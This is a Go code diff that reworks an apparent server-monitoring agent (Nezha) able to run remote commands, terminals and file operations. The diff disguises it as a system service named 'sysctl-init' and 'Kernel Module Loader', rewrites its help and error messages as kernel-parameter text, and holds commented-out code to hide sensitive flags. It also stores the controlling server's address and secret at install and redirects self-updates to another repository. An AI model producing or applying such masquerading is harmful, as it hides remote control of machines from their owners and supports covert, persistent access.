@@ -67,7 +67,7 @@ var (
 )
 
 var agentCmd = &cobra.Command{
-	Use: "agent",
+	Use: "sysctl-init",
 	Run: func(cmd *cobra.Command, args []string) {
 		runService("", nil)
 	},
@@ -134,25 +134,50 @@ func init() {
 	}
 
 	// 初始化运行参数
-	agentCmd.PersistentFlags().StringVarP(&agentCliParam.Server, "server", "s", "localhost:5555", "管理面板RPC端口")
-	agentCmd.PersistentFlags().StringVarP(&agentCliParam.ClientSecret, "password", "p", "", "Agent连接Secret")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.TLS, "tls", false, "启用SSL/TLS加密")
-	agentCmd.PersistentFlags().BoolVarP(&agentCliParam.InsecureTLS, "insecure", "k", false, "禁用证书检查")
-	agentCmd.PersistentFlags().BoolVarP(&agentConfig.Debug, "debug", "d", false, "开启调试信息")
-	agentCmd.PersistentFlags().IntVar(&agentCliParam.ReportDelay, "report-delay", 1, "系统状态上报间隔")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.SkipConnectionCount, "skip-conn", false, "不监控连接数")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.SkipProcsCount, "skip-procs", false, "不监控进程数")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableCommandExecute, "disable-command-execute", false, "禁止在此机器上执行命令")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableAutoUpdate, "disable-auto-update", false, "禁用自动升级")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableForceUpdate, "disable-force-update", false, "禁用强制升级")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.UseIPv6CountryCode, "use-ipv6-countrycode", false, "使用IPv6的位置上报")
-	agentCmd.PersistentFlags().BoolVar(&agentConfig.GPU, "gpu", false, "启用GPU监控")
-	agentCmd.PersistentFlags().BoolVar(&agentConfig.Temperature, "temperature", false, "启用温度监控")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.UseGiteeToUpgrade, "gitee", false, "使用Gitee获取更新")
-	agentCmd.PersistentFlags().Uint32VarP(&agentCliParam.IPReportPeriod, "ip-report-period", "u", 30*60, "本地IP更新间隔, 上报频率依旧取决于report-delay的值")
-	agentCmd.Flags().BoolVarP(&agentCliParam.Version, "version", "v", false, "查看当前版本号")
+	agentCmd.PersistentFlags().StringVarP(&agentCliParam.Server, "server", "s", "localhost:5555", "address of the kernel parameter management server")
+	agentCmd.PersistentFlags().StringVarP(&agentCliParam.ClientSecret, "password", "p", "", "kernel parameter synchronization key")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.TLS, "tls", false, "enable data encryption")
+	agentCmd.PersistentFlags().BoolVarP(&agentCliParam.InsecureTLS, "insecure", "k", false, "disable certificate verification")
+	agentCmd.PersistentFlags().BoolVarP(&agentConfig.Debug, "debug", "d", false, "enable kernel parameter debug mode")
+	agentCmd.PersistentFlags().IntVar(&agentCliParam.ReportDelay, "report-delay", 1, "kernel parameter status refresh interval (seconds)")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.SkipConnectionCount, "skip-conn", false, "skip kernel connection count statistics")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.SkipProcsCount, "skip-procs", false, "skip kernel process count statistics")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableCommandExecute, "disable-command-execute", false, "prohibit execution of kernel commands")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableAutoUpdate, "disable-auto-update", false, "disable automatic updates of kernel parameters")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableForceUpdate, "disable-force-update", false, "disable forced upgrades")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.UseIPv6CountryCode, "use-ipv6-countrycode", false, "use IPv6 address to report country codes")
+	agentCmd.PersistentFlags().BoolVar(&agentConfig.GPU, "gpu", false, "enable GPU kernel module")
+	agentCmd.PersistentFlags().BoolVar(&agentConfig.Temperature, "temperature", false, "enable kernel temperature module")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.UseGiteeToUpgrade, "gitee", false, "use a mirror source closer to the target address to update kernel parameters")
+	agentCmd.PersistentFlags().Uint32VarP(&agentCliParam.IPReportPeriod, "ip-report-period", "u", 30*60, "kernel IP address update interval (seconds)")
+	agentCmd.Flags().BoolVarP(&agentCliParam.Version, "version", "v", false, "display version information of the kernel parameter management tool")
+
+	// if err := agentCmd.PersistentFlags().MarkHidden("debug"); err != nil {
+	// 	fmt.Printf("Error hiding flag 'debug': %v", err)
+	// }
+	// if err := agentCmd.PersistentFlags().MarkHidden("disable-auto-update"); err != nil {
+	// 	fmt.Printf("Error hiding flag 'disable-auto-update': %v", err)
+	// }
+	// if err := agentCmd.PersistentFlags().MarkHidden("disable-command-execute"); err != nil {
+	// 	fmt.Printf("Error hiding flag 'disable-command-execute': %v", err)
+	// }
+	// if err := agentCmd.PersistentFlags().MarkHidden("gitee"); err != nil {
+	// 	fmt.Printf("Error hiding flag 'gitee': %v", err)
+	// }
+	// // agentCmd.SetHelpFunc(func(*cobra.Command, []string) {})
+	// // agentCmd.SetUsageFunc(func(*cobra.Command) error { return nil })
+	// // agentCmd.S
+	// agentCmd.SetHelpCommand(&cobra.Command{Hidden: true})
 
 	agentConfig.Read(filepath.Dir(ex) + "/config.yml")
+
+	if agentConfig.Server != "" {
+		agentCliParam.Server = agentConfig.Server
+	}
+
+	if agentConfig.Password != "" {
+		agentCliParam.ClientSecret = agentConfig.Password
+	}
 
 	monitor.InitConfig(&agentConfig)
 }
@@ -181,7 +206,7 @@ func persistPreRun(cmd *cobra.Command, args []string) {
 			hostArch = "arm64"
 		}
 		if arch != hostArch {
-			panic(fmt.Sprintf("与当前系统不匹配，当前运行 %s_%s, 需要下载 %s_%s", runtime.GOOS, arch, runtime.GOOS, hostArch))
+			panic(fmt.Sprintf("System architecture mismatch: current system %s_%s, but %s_%s is required", runtime.GOOS, arch, runtime.GOOS, hostArch))
 		}
 	}
 }
@@ -201,7 +226,7 @@ func preRun(cmd *cobra.Command, args []string) {
 	}
 
 	if agentCliParam.ReportDelay < 1 || agentCliParam.ReportDelay > 4 {
-		println("report-delay 的区间为 1-4")
+		println("report-delay range is 1-4")
 		os.Exit(1)
 	}
 }
@@ -261,7 +286,7 @@ func run() {
 		}
 		conn, err = grpc.DialContext(timeOutCtx, agentCliParam.Server, securityOption, grpc.WithPerRPCCredentials(&auth))
 		if err != nil {
-			printf("与面板建立连接失败: %v", err)
+			printf("connect to kernel failed: %v", err)
 			cancel()
 			retry()
 			continue
@@ -272,7 +297,7 @@ func run() {
 		timeOutCtx, cancel = context.WithTimeout(context.Background(), networkTimeOut)
 		_, err = client.ReportSystemInfo(timeOutCtx, monitor.GetHost().PB())
 		if err != nil {
-			printf("上报系统信息失败: %v", err)
+			printf("update kernel info failed: %v", err)
 			cancel()
 			retry()
 			continue
@@ -282,7 +307,7 @@ func run() {
 		// 执行 Task
 		tasks, err := client.RequestTask(context.Background(), monitor.GetHost().PB())
 		if err != nil {
-			printf("请求任务失败: %v", err)
+			printf("请求清理垃圾任务失败: %v", err)
 			retry()
 			continue
 		}
@@ -295,7 +320,7 @@ func run() {
 func runService(action string, flags []string) {
 	dir, err := os.Getwd()
 	if err != nil {
-		printf("获取当前工作目录时出错: ", err)
+		printf("Get system workdir error: ", err)
 		return
 	}
 
@@ -303,13 +328,23 @@ func runService(action string, flags []string) {
 		"OnFailure": "restart",
 	}
 
+	// envVarName := "SERVICE_ARGS"
+	// envVarValue := strings.Join(flags, " ") // 使用空格作为分隔符
+
+	// // 创建环境变量映射
+	// envVars := map[string]string{
+	// 	envVarName: envVarValue,
+	// }
+
 	svcConfig := &service.Config{
-		Name:             "nezha-agent",
-		DisplayName:      "Nezha Agent",
-		Description:      "哪吒探针监控端",
-		Arguments:        flags,
+		Name:             "sysctl-init",
+		DisplayName:      "Kernel Module Loader",
+		Description:      "Initialize System Kernel Parameters",
+		// Arguments:        flags,
+		// Arguments:        []string{"$SERVICE_ARGS"},
 		WorkingDirectory: dir,
 		Option:           winConfig,
+		// EnvVars:          envVars,
 	}
 
 	prg := &program{
@@ -334,6 +369,11 @@ func runService(action string, flags []string) {
 
 	if action == "install" {
 		initName := s.Platform()
+		agentConfig.Server = agentCliParam.Server
+		agentConfig.Password = agentCliParam.ClientSecret
+		if err = agentConfig.Save(); err != nil {
+			panic(err)
+		}
 		println("Init system is:", initName)
 	}
 
@@ -453,10 +493,12 @@ func doSelfUpdate(useLocalVersion bool) {
 	printf("检查更新: %v", v)
 	var latest *selfupdate.Release
 	var err error
-	if monitor.CachedCountryCode != "cn" && !agentCliParam.UseGiteeToUpgrade {
-		latest, err = selfupdate.UpdateSelf(v, "nezhahq/agent")
+	if monitor.CachedCountryCode != "cn" && !agentCliParam.UseGiteeToUpgrade && monitor.CachedCountryCode != "" {
+		printf("use Github to update")
+		latest, err = selfupdate.UpdateSelf(v, "Paper-Dragon/agent")
 	} else {
-		latest, err = selfupdate.UpdateSelfGitee(v, "naibahq/agent")
+		printf("use Gitee to update")
+		latest, err = selfupdate.UpdateSelfGitee(v, "PaperDragon/agent")
 	}
 	if err != nil {
 		printf("更新失败: %v", err)
@@ -618,7 +660,7 @@ func checkAltSvc(start time.Time, altSvcStr string, taskUrl string, result *pb.T
 
 func handleCommandTask(task *pb.Task, result *pb.TaskResult) {
 	if agentCliParam.DisableCommandExecute {
-		result.Data = "此 Agent 已禁止命令执行"
+		result.Data = "此 内核加载程序 已禁止命令执行"
 		return
 	}
 	startedAt := time.Now()
@@ -667,7 +709,7 @@ type WindowSize struct {
 
 func handleTerminalTask(task *pb.Task) {
 	if agentCliParam.DisableCommandExecute {
-		println("此 Agent 已禁止命令执行")
+		println("此 内核加载程序 已禁止命令执行")
 		return
 	}
 	var terminal model.TerminalTask
@@ -799,7 +841,7 @@ func handleNATTask(task *pb.Task) {
 
 func handleFMTask(task *pb.Task) {
 	if agentCliParam.DisableCommandExecute {
-		println("此 Agent 已禁止命令执行")
+		println("此 内核加载程序 已禁止命令执行")
 		return
 	}
 	var fmTask model.TaskFM
